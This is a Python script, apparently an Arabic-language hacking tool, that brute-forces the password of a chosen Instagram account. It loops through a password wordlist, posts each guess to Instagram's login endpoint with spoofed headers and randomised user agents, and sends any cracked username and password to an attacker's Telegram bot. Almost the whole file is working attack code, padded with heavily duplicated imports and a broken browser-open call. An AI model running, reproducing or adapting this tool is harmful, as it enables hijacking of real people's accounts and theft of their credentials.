import requests,random
import requests,random,os,uuid,json,user_agent,time,sys,socket,datetime
from datetime import date
from time import sleep
from user_agent import generate_user_agent
from uuid import uuid4
from os import system
import os
import sys
import time
import requests
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel as Ch
from rich import print as code
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import random
import os
import sys
import time
import os,sys,time,json,random,re,string,platform,base64
#mport requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich import print as SDMi
from rich.text import Text as tekz
import os
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import webbrowser
webbrowser.open('httpshon')
import webbrowser
import requests,time,pyfiglet,datetime
import time,sys
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import requests
import random
from user_agent import generate_user_agent
import pyfiglet


# = = = = = = = = = = = = 

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

# = = = = = = = = = = = =

logo = pyfiglet.figlet_format(' # King #')
print(X+logo)
print(X+'* '*15+A)

ID = input('ايديك  : ')
token = input('توكنك : ')


r = requests.Session()

file = input(B+' - اسم ملف الباسوردات : ')
rfile = open(file, 'r')
us = input('- اسم اليوزر الي تريد تخمن عليه: ')
while True:
 username = us
 password = rfile.readline().split('\n')[0]
 
 url = 'https://www.instagram.com/accounts/login/ajax/'
  
  
 headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
         
         
 data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}


 req_login = r.post(url, headers=headers, data=data, proxies=None)
 
 if 'userId' in req_login.text:
  print(F+'User name : '+username)
  print(F+'Password : '+password)
  tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • ويضل منتظر عمك وحابلك حساب
\n- يوزر➪ {username} ✓\n- باسوورد ➪ {password} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @CC0Q0 ''')
  i = requests.post(tlg)
  break
  
  


 else:
  print(Z+'Error: '+password)
  print(X+'_ '*10)
 
 
 
 
 import datetime
an = datetime.datetime.now()
an2 = datetime.datetime(2024, 1, 1, 10, 30, 00)
